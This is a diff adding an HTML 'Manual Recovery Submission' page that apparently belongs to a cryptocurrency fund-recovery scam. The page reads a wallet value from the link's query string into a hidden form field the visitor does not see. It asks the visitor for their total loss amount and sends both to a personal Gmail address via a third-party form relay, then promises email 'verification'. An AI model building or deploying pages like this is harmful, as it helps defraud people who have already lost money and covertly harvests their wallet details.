@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Manual Submission</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#070617; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; padding:20px; }
+    .form-container { background:#0f0b16; padding:30px; border-radius:12px; width:100%; max-width:500px; text-align:center; }
+    input[type="text"] { width:100%; padding:12px; border-radius:6px; margin-top:15px; font-size:16px; }
+    button { background:#6f67ff; padding:15px 30px; border-radius:6px; border:none; color:#fff; font-weight:700; margin-top:20px; cursor:pointer; }
+    small { color:#aaa; margin-top:20px; font-size:12px; }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Manual Recovery Submission</h2>
+    <form method="POST" action="https://formsubmit.co/luckyboycity9@gmail.com" target="_blank">
+      <input type="hidden" name="_subject" value="New Total Loss submission">
+      <input type="hidden" name="wallet" id="hiddenWallet" value="">
+      <label for="total_loss">Total Loss Amount</label>
+      <input type="text" name="total_loss" id="total_loss" placeholder="e.g. 0.5 ETH or 1200 USD" required>
+      <button type="submit">Submit</button>
+    </form>
+    <small>First-time submissions will require verification via email.</small>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const wallet = params.get('wallet') || 'Unknown';
+    document.getElementById('hiddenWallet').value = wallet;
+  </script>
+</body>
+</html>
